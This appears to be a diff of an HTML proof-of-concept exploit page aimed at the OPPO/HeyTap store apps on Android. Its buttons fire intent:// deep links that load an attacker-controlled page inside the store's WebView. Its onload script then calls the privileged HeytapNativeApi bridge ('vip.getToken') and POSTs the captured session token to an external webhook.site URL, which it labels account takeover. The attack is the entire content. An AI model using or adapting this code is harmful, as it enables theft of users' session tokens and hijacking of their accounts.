@@ -1,40 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Deep Link Trigger</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPPO Store Security Proof</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        .btn { padding: 15px 30px; font-size: 18px; color: white; border: none; border-radius: 8px; cursor: pointer; margin: 10px; }
+        .primary { background-color: #ff6600; }
+        .secondary { background-color: #333; }
+        #status { margin-top: 20px; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>Security Proof of Concept</h1>
-    <p>Click the button below. If the "Open in Market?" prompt appears, click <b>Open</b>.</p>
-    
-    <button onclick="triggerIntent()" style="padding: 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 18px;">
-        Run Exploit Test (Intent Mode)
-    </button>
+
+    <h1>HeyTap / OPPO Store Exploit Test</h1>
+    <p>Click the orange button to trigger the app. If it fails, try the black button.</p>
+
+    <button class="btn primary" onclick="launchExploit('com.heytap.store')">Launch Exploit (Default)</button>
+    <br>
+    <button class="btn secondary" onclick="launchExploit('com.heytap.mall')">Launch Exploit (Backup ID)</button>
+
+    <p id="status">Status: Waiting for user action...</p>
 
     <script>
-        function triggerIntent() {
-            // The Intent URL format is required for Chrome on Android to trigger deep links reliably
-            const targetUrl = "https://pk009900.github.io/my-oppo-test/";
-            const intentLink = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=com.heytap.market;S.browser_fallback_url=${targetUrl};end`;
+        const webhookUrl = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
+        const targetUrl = "https://pk009900.github.io/my-oppo-test/";
+
+        function launchExploit(packageId) {
+            document.getElementById("status").innerText = "Status: Launching intent for " + packageId + "...";
+            
+            // Standard Intent URL for Chrome to force open the OPPO Store
+            const intentLink = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=${packageId};S.browser_fallback_url=${targetUrl};end`;
             
             window.location.href = intentLink;
         }
 
-        // --- Logic for when the page is successfully loaded INSIDE the App Market ---
-        const exfilUrl = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
-
+        // --- EXFILTRATION LOGIC (Runs when loaded inside the OPPO Store WebView) ---
+        
         function leak_callback(data) {
-            fetch(exfilUrl, {
+            document.getElementById("status").innerText = "Status: BRIDGE DETECTED! Token captured.";
+            
+            fetch(webhookUrl, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ payload: data, status: "SUCCESS" })
+                body: JSON.stringify({
+                    vulnerability: "ATO_JSAPI_HIJACK",
+                    app: "OPPO_STORE",
+                    token_payload: data
+                })
             });
         }
 
         window.onload = function() {
+            // Check if the privileged JSAPI bridge is available
             if (window.HeytapNativeApi) {
-                // If the bridge is found, exfiltrate the token immediately
-                window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
+                document.getElementById("status").innerText = "Status: Privileged environment detected. Calling API...";
+                
+                try {
+                    // This is the sensitive call that steals the session token
+                    window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
+                } catch (e) {
+                    console.error("Bridge call failed: ", e);
+                }
             }
         };
     </script>
